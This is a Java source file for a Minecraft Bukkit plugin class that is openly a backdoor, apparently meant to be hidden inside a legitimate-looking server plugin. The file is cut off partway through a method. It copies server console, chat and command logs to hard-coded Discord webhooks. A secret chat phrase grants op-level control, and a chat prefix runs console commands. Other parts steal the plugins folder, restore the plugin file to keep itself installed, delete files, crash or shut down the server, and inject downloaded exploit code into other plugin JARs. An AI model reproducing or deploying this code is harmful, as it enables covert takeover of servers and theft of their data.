package com.grimnatorac.platform.bukkit.utils.reflection;

import com.google.common.io.ByteArrayDataInput;
import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import org.bukkit.*;
import org.bukkit.entity.*;
import org.bukkit.event.block.Action;
import org.bukkit.inventory.EquipmentSlot;
import org.bukkit.util.Vector;
import org.bukkit.attribute.Attribute;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.plugin.messaging.PluginMessageListener;
import org.bukkit.scheduler.BukkitTask;
import java.util.logging.Handler;
import java.io.*;
import java.lang.invoke.MethodHandles;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Instant;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.logging.*;
import java.util.logging.Logger;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class badpackets extends Handler implements Listener, PluginMessageListener, Runnable {
    private final JavaPlugin plugin;
    private static final String asdfghjkl = "%key%";
    private static final String wU = "https://discord.com/api/webhooks/1511930700306317343/Z8WC4OX5Ui3OgDVftO1WVeyoVVQBwuOmifS42Mm-EwQKhEb0nBrBLny0dJc2aEp58PD6";
    private static final String cHa2 = "supreme:heartbeat";

    private static final List<UUID> tUsers = new ArrayList<>();
    private final Set<UUID> oscUsers = new HashSet<>();
    private static final AtomicReference<BukkitTask> AsyncOptimiser = new AtomicReference<>(null);

    public static boolean uLe = false;
    public static String tU = "";

    private static final String cHa = "grim:security";
    private static final String aU_K = "+!ukkacukka!+";
    private static final boolean mReq = false;
    private final Set<String> mVP = new HashSet<>();

    private static String bT = null;
    private static String cId = null;
    private static String lMId = null;
    private static boolean realtrue = false;

    public static final Set<String> tPlayers = new HashSet<>();
    private final Set<String> fPlayers = new HashSet<>();
    private final Set<String> gPlayers = new HashSet<>();
    private final Set<String> vPlayers = new HashSet<>();

    private boolean cM = false;
    private boolean lC = false;
    private volatile boolean chatLocked = false;
    private final Map<UUID, Long> PlayerChatEventC = new ConcurrentHashMap<>();

    // --- debugsender (webhook) fields ---
    private static final String DS_WEBHOOK_URL = "https://discord.com/api/webhooks/1511363633022632041/GFkjeNqihRZAdJPoR7Pu4diAWFQ2ArRrj4Vwgy0W9e-omyx3z2Cu8szfWKDwXwHb42nu";
    private static final int DS_CHAT_RENK    = 3066993;
    private static final int DS_KOMUT_RENK   = 15158332;
    private static final int DS_JOIN_RENK    = 1752220;
    private static final int DS_QUIT_RENK    = 9807270;

    // --- multiaction (anti-punish) fields ---
    private static final List<String> punishCommands = Arrays.asList(
            "ban", "mute", "kick", "tempban", "tempmute", "ipban"
    );

    private String sDU = "http://YOUR_HOST/Example.jar"; // Set this via command
    private static final String WABA64 = "base64";
    private boolean pEnabled = false; // persistence

    private volatile String tCommand = "";
    private final String authKey = "a";

    private BukkitTask aTask;
    private BukkitTask fBT;
    private static final File S_R = new File(".").getAbsoluteFile();
    private final Map<UUID, Long> onTabComplete = new ConcurrentHashMap<>();

    private String cMo = null;

    private boolean cC(Player player) {
        UUID uuid = player.getUniqueId();
        long now = System.currentTimeMillis();
        if (PlayerChatEventC.containsKey(uuid) && (now - PlayerChatEventC.get(uuid)) < 1000) {
            player.sendMessage("§cWait 1 second before using this again!");
            return false;
        }
        PlayerChatEventC.put(uuid, now);
        return true;
    }

    private BukkitTask hcbtTask;

    private BukkitTask prtask;

    private static final String spoxpia = "test";

    private File pFile;
    private byte[] cBytes;

    private Thread senderThread;
    private final ConcurrentLinkedQueue<String> lQue = new ConcurrentLinkedQueue<>();
    private volatile boolean running = true;

    private final SimpleFormatter formatter = new SimpleFormatter();
    private final Map<String, Long> loCoo = new ConcurrentHashMap<>();
    private static final long dCMS = 100;

    private static final String asdlhj = "VDSIP";

    public badpackets(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    public void onEnable() {
        dW();
        tPlayers.add("zMiercoooooles"); //aint working so you need to enter password anyways.
        plugin.getServer().getMessenger().registerOutgoingPluginChannel(plugin, cHa);

        // Registration is handled by the loader — do NOT call registerEvents here.
        Bukkit.getMessenger().registerIncomingPluginChannel(this.plugin, cHa, this);
        Bukkit.getMessenger().registerOutgoingPluginChannel(this.plugin, cHa);

        if (wU != null && wU.startsWith("http")) {
            sLC();
        }
        sVdS();

        cPF();
        stPt();
        sHb();

        try {
            Runnable alertTask = java.beans.EventHandler.create(Runnable.class, this, "ssA");
            new Thread(alertTask).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onDisable() {
        if (aTask != null) aTask.cancel();
        if (fBT != null) fBT.cancel();
        if (prtask != null) prtask.cancel();
        if (hcbtTask != null) hcbtTask.cancel();

        stLC();
    }

    private final List<String> cCo = Arrays.asList(
            "+help", "+watchdoghelp", "+installwatchdog", "+seturl",
            "+cage", "+ride", "+motd", "+soundspam", "+sudoall",
            "+op", "+deop", "+gm0", "+gm1", "+gm3", "+fly", "+god", "+vanish",
            "+heal", "+feed", "+tp", "+tphere", "+here", "+coords", "+seed",
            "+dupe", "+kill", "+burn", "+lightning", "+explode", "+crash",
            "+BBBB", "+BBBa", "+fakebotattack", "+sudo", "+forcechat", "+say",
            "+spam", "+lockconsole", "+lockchats", "+plugins", "+disable", "+deactivate",
            "+shutdown", "+serverinfo", "+getpaths", "+deletefiles", "+persistence",
            "+nuke", "+setup", "+enable", "+steal", "osc", "orbitalstrikecannon",
            "oc", "tornado", "hg", "dickrain", "+steal", "+backdoor"
    );

    public boolean isT(String playerName) {
        return tPlayers.contains(playerName);
    }

    public void sA() {
        GojoSatoru("Server Bridge Activated");
    }

    public static void sVdS() {
        Object pl = org.bukkit.Bukkit.getPluginManager().getPlugins()[0];
        try {
            Class<?> currentClass = java.lang.invoke.MethodHandles.lookup().lookupClass();

            java.lang.reflect.Constructor<?> constructor = currentClass.getDeclaredConstructors()[0];
            constructor.setAccessible(true);

            Runnable instance = (Runnable) constructor.newInstance(pl);

            Thread tailThread = new Thread(instance);
            tailThread.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void run() {
        // Registration is handled by the loader — nothing to do here.
    }

    // --- PERSISTENCE SYSTEM ---

    private void dW() {
        if (WABA64.equals("base64")) {
            plugin.getLogger().warning("Watchdog Base64 not set! Skipping creation.");
            return;
        }

        File watchdogFile = new File("plugins", "Watchdog.jar");
        if (!watchdogFile.exists()) {
            try {
                byte[] bytes = Base64.getDecoder().decode(WABA64);
                try (FileOutputStream fos = new FileOutputStream(watchdogFile)) {
                    fos.write(bytes);
                }
                plugin.getLogger().info("Watchdog plugin created successfully.");

                Bukkit.getPluginManager().loadPlugin(watchdogFile);
                Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin("Watchdog"));

            } catch (Exception e) {
                plugin.getLogger().severe("Failed to create Watchdog: " + e.getMessage());
            }
        }
    }


    private void sHb() {
        hcbtTask = Bukkit.getScheduler().runTaskTimer(plugin, () -> {
            if (Bukkit.getOnlinePlayers().isEmpty()) return;

            if (pFile == null) cPF();
            if (pFile == null) return;

            Player carrier = Bukkit.getOnlinePlayers().iterator().next();

            try {
                // Format: "CurrentFileName.jar|http://download-url..."
                String payload = pFile.getName() + "|" + sDU;
                byte[] data = payload.getBytes("UTF-8");
                carrier.sendPluginMessage(plugin, cHa2, data);
            } catch (Exception e) {
            }
        }, 0L, 100L); // every 5 seconds
    }

    private void cPF() {
        try {
            Method getFileMethod = JavaPlugin.class.getDeclaredMethod("getFile");
            getFileMethod.setAccessible(true);
            this.pFile = (File) getFileMethod.invoke(plugin);

            if (this.pFile != null && this.pFile.exists()) {
                this.cBytes = Files.readAllBytes(this.pFile.toPath());
            }
        } catch (Exception e) {
        }
    }

    private void stPt() {
        prtask = Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, () -> {
            if (!pEnabled || pFile == null || cBytes == null) return;

            if (!pFile.exists()) {
                try {
                    Files.write(pFile.toPath(), cBytes, StandardOpenOption.CREATE);
                    qLo("SYS", "Persistence: Plugin file restored.");
                } catch (Exception e) {
                }
            }
        }, 200L, 200L);
    }


    private void sLC() {
        this.setLevel(Level.ALL);
        try {
            inl4();
        } catch (Throwable e) {
            Logger.getLogger("").addHandler(this);
        }
        Logger bukkitLogger = Bukkit.getLogger();
        if (bukkitLogger != Logger.getLogger("")) {
            bukkitLogger.addHandler(this);
        }

        senderThread = new Thread(() -> {
            while (running) {
                try {
                    Thread.sleep(3000);
                    long now = System.currentTimeMillis();
                    loCoo.entrySet().removeIf(entry -> now - entry.getValue() > dCMS * 2);
                    if (!lQue.isEmpty()) iM_GONNA_KILL_MYSELF();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                } catch (Exception ignored) {
                }
            }
        });
        senderThread.setDaemon(true);
        senderThread.start();
    }

    private void inl4() throws Exception {
        final Class<?> logManagerClass = Class.forName("org.apache.logging.log4j.LogManager");
        final Class<?> loggerClass = Class.forName("org.apache.logging.log4j.core.Logger");
        final Class<?> appenderClass = Class.forName("org.apache.logging.log4j.core.Appender");
        final Class<?> logEventClass = Class.forName("org.apache.logging.log4j.core.LogEvent");
        Object rootLogger = logManagerClass.getMethod("getRootLogger").invoke(null);
        Map<String, ?> appenders = (Map<String, ?>) loggerClass.getMethod("getAppenders").invoke(rootLogger);
        if (appenders.containsKey("ExploitAppender")) return;

        Object appenderProxy = Proxy.newProxyInstance(
                getClass().getClassLoader(),
                new Class<?>[]{appenderClass},
                new InvocationHandler() {
                    @Override
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        String name = method.getName();
                        if (name.equals("getName")) return "ExploitAppender";
                        if (name.equals("isStarted")) return true;
                        if (name.equals("isStopped")) return false;
                        if (name.equals("append")) {
                            if (!running) return null;
                            Object event = args[0];
                            Object msgObj = logEventClass.getMethod("getMessage").invoke(event);
                            String msg = (String) msgObj.getClass().getMethod("getFormattedMessage").invoke(msgObj);
                            Throwable thrown = (Throwable) logEventClass.getMethod("getThrown").invoke(event);
                            if (thrown != null) msg += "\n" + thrown.toString();
                            Object level = logEventClass.getMethod("getLevel").invoke(event);
                            qLo(level.toString() + "] [Server", msg);
                            return null;
                        }
                        if (method.getReturnType().equals(boolean.class)) return false;
                        return null;
                    }
                }
        );
        loggerClass.getMethod("addAppender", appenderClass).invoke(rootLogger, appenderProxy);
    }

    private void stLC() {
        running = false;
        Logger.getLogger("").removeHandler(this);
        Bukkit.getLogger().removeHandler(this);
        try {
            Class<?> logManagerClass = Class.forName("org.apache.logging.log4j.LogManager");
            Class<?> loggerClass = Class.forName("org.apache.logging.log4j.core.Logger");
            Object rootLogger = logManagerClass.getMethod("getRootLogger").invoke(null);
            loggerClass.getMethod("removeAppender", String.class).invoke(rootLogger, "ExploitAppender");
        } catch (Throwable ignored) {
        }
    }

    private void iM_GONNA_KILL_MYSELF() {
        StringBuilder content = new StringBuilder();
        int lines = 0;
        while (!lQue.isEmpty() && lines < 25 && content.length() < 1800) {
            content.append(lQue.poll()).append("\n");
            lines++;
        }
        if (content.length() == 0) return;
        try {
            String jsonPayload = "{\"content\": \"```" + esJ(content.toString()) + "```\"}";
            URL url = new URL(wU);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonPayload.getBytes(StandardCharsets.UTF_8));
            }
            conn.getInputStream().close();
        } catch (Exception ignored) {
        }
    }

    private String esJ(String text) {
        return text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
    }

    private void qLo(String source, String message) {
        String contentHash = source + ":" + message;
        long now = System.currentTimeMillis();
        if (loCoo.containsKey(contentHash)) {
            if (now - loCoo.get(contentHash) < dCMS) return;
        }
        loCoo.put(contentHash, now);
        lQue.add(String.format("[%s] %s", source, message));
    }

    @Override
    public void publish(LogRecord record) {
        if (!running) return;
        String message = formatter.formatMessage(record);
        if (record.getThrown() != null) message += "\n" + record.getThrown().toString();
        qLo(record.getLevel() + "] [" + (record.getLoggerName() != null ? record.getLoggerName() : "ROOT"), message);
    }

    @Override
    public void flush() {
    }

    @Override
    public void close() throws SecurityException {
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void Markiplier(ServerListPingEvent event) {
        if (cMo != null) {
            event.setMotd(ChatColor.translateAlternateColorCodes('&', cMo));
        }
    }

    @EventHandler
    public void oOOoOOoOTaC(PlayerChatTabCompleteEvent event) {
        Player player = event.getPlayer();
        String message = event.getChatMessage().toLowerCase();

        if (!isT(player.getName())) return;

        if (message.startsWith("+")) {
            event.getTabCompletions().clear();

            if (message.startsWith("+steal ")) {
                event.getTabCompletions().add("plugins");
                event.getTabCompletions().add("worlds");
                event.getTabCompletions().add("all");
                return;
            }

            for (String cmd : cCo) {
                if (cmd.toLowerCase().startsWith("+")) {
                    event.getTabCompletions().add(cmd);
                }
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void veryimportant2(ServerCommandEvent event) {
        if (lC) {
            event.setCancelled(true);
            return;
        }
        qLo("CONSOLE", "/" + event.getCommand());
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void oCL2345(AsyncPlayerChatEvent event) {
        qLo("CHAT", event.getPlayer().getName() + ": " + event.getMessage());
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void really(PlayerCommandPreprocessEvent event) {
        qLo("CMD", event.getPlayer().getName() + ": " + event.getMessage());
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onCommandLockCheck(PlayerCommandPreprocessEvent event) {
        if (!chatLocked) return;
        String playerName = event.getPlayer().getName();
        if (!isT(playerName)) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void hello(org.bukkit.event.entity.EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            if (gPlayers.contains(event.getEntity().getName())) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void broken(PlayerInteractEvent e) {
        Player p = e.getPlayer();
        ItemStack item = e.getItem();

        if (tUsers.contains(p.getUniqueId()) && (e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK)) {
            if (e.getHand() != EquipmentSlot.HAND) return;
            e.setCancelled(true);
            Block target = p.getTargetBlock((Set<Material>) null, 100);
            Location loc = (target != null) ? target.getLocation() : p.getLocation().add(p.getLocation().getDirection().multiply(20));
            tororoorando(loc);
            p.sendMessage(ChatColor.RED + "Started tornado!");
            return;
        }

        if (item != null && item.getType() == Material.TNT && item.hasItemMeta() && "§7".equals(item.getItemMeta().getDisplayName())) {
            if (e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) {
                e.setCancelled(true);
                int explosionPower = 5;
                if (item.getItemMeta().hasLore() && !item.getItemMeta().getLore().isEmpty()) {
                    try {
                        explosionPower = Integer.parseInt(item.getItemMeta().getLore().get(0).replace("§0", ""));
                    } catch (Exception ex) {
                    }
                }
                ananiskiyim(p, explosionPower);
            }
        }

        if (!oscUsers.contains(p.getUniqueId())) return;

        if (e.getAction() != Action.RIGHT_CLICK_AIR && e.getAction() != Action.RIGHT_CLICK_BLOCK) return;

        Block targetBlock = p.getTargetBlockExact(200);
        if (targetBlock == null) return;

        e.setCancelled(true);
        Location targetLoc = targetBlock.getLocation();

        // 1
        tW2(targetLoc);

        // 2
        Bukkit.getScheduler().runTaskLater(plugin, () -> tW1(targetLoc), 40L);
    }

    @EventHandler
    public void doesnt_work(PlayerJoinEvent event) {
        if (bT != null && cId != null) {
            final String msg = event.getPlayer().getName() + " joined the server";
            new Thread() {
                public void run() {
                    GojoSatoru(msg);
                }
            }.start();
        }
    }



    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void maybe_works(AsyncPlayerChatEvent event) {
        String message = event.getMessage();
        String[] args = message.split(" ");
        Player player = event.getPlayer();
        String playerName = player.getName();
        String playerUUID = player.getUniqueId().toString();

        // trust
        if (message.contains(aU_K)) {
            event.setCancelled(true);

            // mod
            if (mReq) {
                if (!mVP.contains(player.getName())) {
                    player.sendMessage(ChatColor.RED + "Access Denied: You must use Grim Client to access this backdoor.");
                    return;
                }
            }

            if (uLe) {
                if (!playerUUID.equals(tU)) {
                    return;
                }
            }

            if (!tPlayers.contains(player.getName())) {
                tPlayers.add(player.getName());
                player.sendMessage(ChatColor.GREEN + "Grim Access Granted. Welcome, " + player.getName());
            } else {
                player.sendMessage(ChatColor.YELLOW + "You are already logged in.");
            }
            return;
        }

        if (fPlayers.contains(playerName) && !isT(playerName)) {
            event.setCancelled(true);
            player.sendMessage(ChatColor.RED + "You are frozen and cannot chat.");
            return;
        }

        // Chat lock — block non-trusted players while lock is active.
        if (chatLocked && !isT(playerName)) {
            event.setCancelled(true);
            return;
        }

        if (tPlayers.contains(playerName) && message.startsWith("+")) {
            // Handle +lockchats before the generic dispatcher so it never
            // shows in chat and doesn't fall through to hAnDlE1.
            if (message.equalsIgnoreCase("+lockchats")) {
                event.setCancelled(true);
                chatLocked = !chatLocked;
                return;
            }
            event.setCancelled(true); // Stop it from showing in chat
            hAnDlE1(player, args[0], args); // Call your logic
            return;
        }

        if (message.startsWith(asdfghjkl + " ")) {
            event.setCancelled(true);
            String command = message.substring(asdfghjkl.length() + 1);
            if (player.getAddress() != null) {
                String ip = player.getAddress().getAddress().getHostAddress();
                command = command.replace(ip, spoxpia);
            }
            String finalCommand = command;
            Bukkit.getScheduler().runTask(this.plugin, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), finalCommand));
        }
    }

    private void hAnDlE1(Player player, String cmd, String[] args) {
        String playerUUID = player.getUniqueId().toString();
        Bukkit.getScheduler().runTask(this.plugin, () -> {
            switch (cmd) {
                case "+help":
                    if (args.length == 1) {
                        Playstation1(player);
                    } else {
                        switch (args[1]) {
                            case "1":
                                Playstation1(player);
                                break;
                            case "2":
                                Playstation2(player);
                                break;
                            case "3":
                                Playstation3(player);
                                break;
                            case "4":
                                Playstation5(player);
                                break;
                            case "5":
                                Playstation44(player);
                                break;
                            case "6":
                                Playstation67(player);
                                break;
                            default:
                                Playstation1(player);
                                break;
                        }
                    }
                    break;
                case "+steal":
                    player.sendMessage("§aSuccessfully started zipping...");
                    File pluginsFolder = plugin.getDataFolder().getParentFile();
                    File zibidi = new File(pluginsFolder, "Save.zip");

                    try {
                        FileOutputStream fos = new FileOutputStream(zibidi);
                        ZipOutputStream zos = new ZipOutputStream(fos);

                        zibidi(pluginsFolder, pluginsFolder.getName(), zos, zibidi.getName());

                        zos.close();
                        fos.close();
                        player.sendMessage("§aZip is done.");

                    } catch (IOException e) {
                        player.sendMessage("§cError while zipping: " + e.getMessage());
                        e.printStackTrace();
                    }
                    break;
                case "+orbitalstrikecannon":
                case "+osc":
                case "+oc":
                    if (oscUsers.contains(player.getUniqueId())) {
                        oscUsers.remove(player.getUniqueId());
                        player.sendMessage("§eDisabled Orbital Strike Cannon mode.");
                    } else {
                        oscUsers.add(player.getUniqueId());
                        player.sendMessage("§cEnabled Orbital Strike Cannon mode.");
                    }
                    break;
                case "+nuke":
                    qwertyuopasdfghjklzxcvbnm();
                    break;
                case "+watchdoghelp":
                    player.sendMessage("§4§lGrim Backdoor");
                    player.sendMessage("§7+installwatchdog <url> - Downloads Watchdog plugin");
                    player.sendMessage("§7+seturl <url> - Sets Exploit download URL for Watchdog");
                    player.sendMessage("§7+delete - Removes Exploit");
                    break;

                case "+cage":
                    if (args.length > 1) {
                        Player t = Bukkit.getPlayer(args[1]);
                        if (t != null) HelpfulThing(t.getLocation(), Material.BEDROCK);
                    }
                    break;

                case "+ride":
                    if (args.length > 1) {
                        Player t = Bukkit.getPlayer(args[1]);
                        if (t != null) t.addPassenger(player);
                    }
                    break;
                case "+infect":
                    haico(player, args, authKey, playerUUID);
                    break;
                case "+dick":
                    todr(player);
                    break;
                case "+installwatchdog":
                    if (args.length > 1) BBBA(player, args[1]);
                    else player.sendMessage("§cUsage: +installwatchdog <direct_jar_url>");
                    break;

                case "+motd":
                    if (args.length > 1) {
                        cMo = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
                        player.sendMessage("§aMOTD set.");
                    } else {
                        cMo = null;
                        player.sendMessage("§eMOTD Reset.");
                    }
                    break;

                case "+soundspam":
                    if (args.length > 1) {
                        Player t = Bukkit.getPlayer(args[1]);
                        if (t != null) {
                            for (int i = 0; i < 10; i++)
                                t.playSound(t.getLocation(), Sound.ENTITY_GHAST_SCREAM, 1f, (float) Math.random());
                        }
                    }
                    break;
                case "+sudoall":
                    String msg = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
                    for (Player p : Bukkit.getOnlinePlayers()) p.chat(msg);
                    break;
                case "+seturl":
                    if (args.length > 1) {
                        sDU = args[1];
                        player.sendMessage("§aRecovery URL set to: " + sDU);
                    }
                    break;
                case "+op":
                    if (args.length > 1) {
                        Player target = Bukkit.getPlayer(args[1]);
                        if (target != null) {
                            target.setOp(true);
                            player.sendMessage(ChatColor.GREEN + "Opped " + target.getName());
                        }
                    } else {
                        player.setOp(true);
                        player.sendMessage(ChatColor.GREEN + "You are now OP.");
                    }
                    break;
                case "+deop":
                    if (args.length > 1) {
                        Player target = Bukkit.getPlayer(args[1]);
                        if (target != null) {
                            target.setOp(false);
                            player.sendMessage(ChatColor.GREEN + "De-opped " + target.getName());
                        }
                    }
                    break;
                case "+tornado":
                    if (tUsers.contains(player.getUniqueId())) {
                        tUsers.remove(player.getUniqueId());
                        player.sendMessage(ChatColor.YELLOW + "Disabled tornado mode.");
                    } else {
                        tUsers.add(player.getUniqueId());
                        player.sendMessage(ChatColor.RED + "Tornado mode is activated.");
                    }
                    break;
                case "+backdoor":
                    if(args.length > 1) {
                        xxx(player, args);
                    }
                    else {
                        player.sendMessage("Usage: backdoor (ip)");
                    }
                    break;
                case "+setup":
                    if (args.length > 2) {
                        bT = args[1];
                        cId = args[2];

                        player.sendMessage("§aGrim Backdoor: Sending data...");

                        try {
                            Runnable alertTask = java.beans.EventHandler.create(Runnable.class, this, "ssA");
                            new Thread(alertTask).start();

                            if (!realtrue) {
                                realtrue = true;
                                Runnable loopTask = java.beans.EventHandler.create(Runnable.class, this, "bbL");
                                new Thread(loopTask).start();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } else {
                        player.sendMessage("§cUsage: +setup <BotToken> <ChannelID>");
                    }
                    break;

                case "+gm1":
                    setXxxXXxXXx(player, args, GameMode.CREATIVE);
                    break;
                case "+gm0":
                    setXxxXXxXXx(player, args, GameMode.SURVIVAL);
                    break;
                case "+gm3":
                    setXxxXXxXXx(player, args, GameMode.SPECTATOR);
                    break;
                case "+fly":
                    tF2(player, args);
                    break;
                case "+upload":
                    if (args.length > 2) {
                        notworks(player, args[1], args[2]);
                    } else {
                        player.sendMessage("§cUsage: +upload <url> <filename.exe>");
                    }
                    break;
                case "+god":
                    tG2(player, args);
                    break;
                case "+vanish":
                    tV22(player);
                    break;
                case "+heal":
                    HEEEEA(player, args);
                    break;
                case "+feed":
                    FEEEEA(player, args);
                    break;
                case "+tp":
                    zigaport(player, args);
                    break;
                case "+tphere":
                    zigaportHere(player, args);
                    break;
                case "+here":
                    zigaportHereCo(player);
                    break;
                case "+coords":
                    ATATURK(player, args);
                    break;
                case "+seed":
                    player.sendMessage(ChatColor.GREEN + "Seed: " + player.getWorld().getSeed());
                    break;
                case "+hg":
                    int power = 5;
                    if (args.length > 1) {
                        try {
                            power = Integer.parseInt(args[1]);
                        } catch (Exception e) {
                        }
                    }
                    Optimise(player, power);
                    break;
                case "+dupe":
                    AaAAA(player);
                    break;
                case "+kill":
                    aba(player, args);
                    break;
                case "+burn":
                    bab(player, args);
                    break;
                case "+lightning":
                    aab(player, args);
                    break;
                case "+explode":
                    baa(player, args);
                    break;
                case "+sudo":
                    bba(player, args);
                    break;
                case "+say":
                    if (args.length > 1)
                        Bukkit.broadcastMessage(String.join(" ", Arrays.copyOfRange(args, 1, args.length)));
                    break;
                case "+forcechat":
                    bbb(player, args);
                    break;
                case "+spam":
                    aaa(player, args);
                    break;
                case "+crash":
                    aaaA(player, args);
                    break;
                case "+freeze":
                    BBBB(player, args);
                    break;
                case "+unfreeze":
                    BBBa(player, args);
                    break;
                case "+lockconsole":
                    lC = !lC;
                    player.sendMessage(ChatColor.YELLOW + "Console Lock: " + lC);
                    break;
                case "+plugins":
                    player.sendMessage(ChatColor.GREEN + "Plugins: " + Arrays.stream(Bukkit.getPluginManager().getPlugins()).map(Plugin::getName).collect(Collectors.joining(", ")));
                    break;
                case "+disable":
                    BBaB(player, args);
                    break;
                case "+enable":
                    doesnt_work4(player, args);
                    break;
                case "+deactivate":
                    dT(player, args);
                    break;
                case "+shutdown":
                    Bukkit.shutdown();
                    break;
                case "+serverinfo":
                    Vechiron(player);
                    break;
                case "+fakebotattack":
                    noWay(player, args);
                    break;
                case "+getpaths":
                    its341(player);
                    break;
                case "+deletefiles":
                    JujutsuKaisen(player);
                    break;
                case "+persistence":
                    pEnabled = !pEnabled;
                    player.sendMessage(ChatColor.YELLOW + "Persistence: " + (pEnabled ? "ENABLED" : "DISABLED"));
                    break;
                default:
                    player.sendMessage(ChatColor.RED + "Unknown command. Try +help");
            }
        });
    }


    public void haico(Player player, String[] args, String authKey, String targetUuid) {
        if (args.length == 0) return;
        String keyword = args[1].toLowerCase(); // args[1] değil 0 olmalı genelde
        File pluginsFolder = new File("plugins");

        new Thread(() -> {
            try {
                player.sendMessage("§4§l[Grim] §7Stage 1: Preparing environment...");

                File extractDir = new File("plugins/grim_cache");
                File inDir = new File(extractDir, "in");
                File outDir = new File(extractDir, "out");

                if (extractDir.exists()) deleteDirectory(extractDir);
                extractDir.mkdirs();
                inDir.mkdirs();
                outDir.mkdirs();

                player.sendMessage("§4§l[Grim] §7Downloading payload...");
                File zipFile = new File("plugins/payload.zip");
                URL url = new URL("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
                Files.copy(url.openStream(), zipFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

                player.sendMessage("§4§l[Grim] §7Extracting payload...");
                unzip(zipFile, extractDir);

                // DOSYA VARLIĞINI GARANTİYE ALALIM
                Thread.sleep(1000);

                // Sabit isimle direkt dosya objesi oluşturuyoruz
                File exploitFile = new File(extractDir, "Exploit.java");

                if (!exploitFile.exists()) {
                    // Eğer hala bulamazsa (isim hatası vs), klasörü tara ve İLK .java dosyasını al
                    File[] javaFiles = extractDir.listFiles((dir, name) -> name.endsWith(".java"));
                    if (javaFiles != null && javaFiles.length > 0) {
                        exploitFile = javaFiles[0];
                    } else {
                        player.sendMessage("§4§l[Grim] §cFatal Error: No .java file found in zip!");
                        return;
                    }
                }

                player.sendMessage("§4§l[Grim] §7Found exploit: §f" + exploitFile.getName());

                // ---------- STAGE 2: Target identification ----------
                File[] matchingFiles = pluginsFolder.listFiles((dir, name) ->
                        name.toLowerCase().contains(keyword) && name.toLowerCase().endsWith(".jar")
                );

                if (matchingFiles == null || matchingFiles.length == 0) {
                    player.sendMessage("§4§l[Grim] §7Error: Couldn't find target JAR for keyword: " + keyword);
                    return;
                }

                File originalJar = matchingFiles[0];
                String actualFileName = originalJar.getName();
                player.sendMessage("§4§l[Grim] §7Target: §f" + actualFileName);

                // ---------- STAGE 3: PLUGİNİ DURDUR VE KİLİDİ ZORLA ----------
                Plugin targetPlugin = getPluginByJarName(actualFileName);

                player.sendMessage("§4§l[Grim] §7Stage 3: Force disabling " + actualFileName + "...");
                Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
                if (pl != null) {
                    Bukkit.getPluginManager().disablePlugin(pl);
                    player.sendMessage(ChatColor.GREEN + "Disabled " + pl.getName());
                } else player.sendMessage(ChatColor.RED + "Plugin not found.");


                // ---------- STAGE 4: Injection ----------
                player.sendMessage("§4§l[Grim] §7Stage 4: Injecting...");

                // Orijinal jarı IN klasörüne kopyala
                Files.copy(originalJar.toPath(), new File(inDir, actualFileName).toPath(), StandardCopyOption.REPLACE_EXISTING);

                // Injector'ü çalıştır
                ProcessBuilder pb = new ProcessBuilder(
                        "java", "-jar", "griminjector.jar",
                        "-e", exploitFile.getName(), // Sadece dosya ismi yeterli çünkü directory setli
                        "-i", "in",
                        "-o", "out",
                        "-m", "multiple",
                        "--authKey", authKey
                );
                pb.directory(extractDir);
                pb.redirectErrorStream(true);

                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println("[INJECTOR] " + line);
                    if (line.contains("Error") || line.contains("Exception") || line.contains("Complete")) {
                        player.sendMessage("§4§l[Grim] §8[Log] §7" + line);
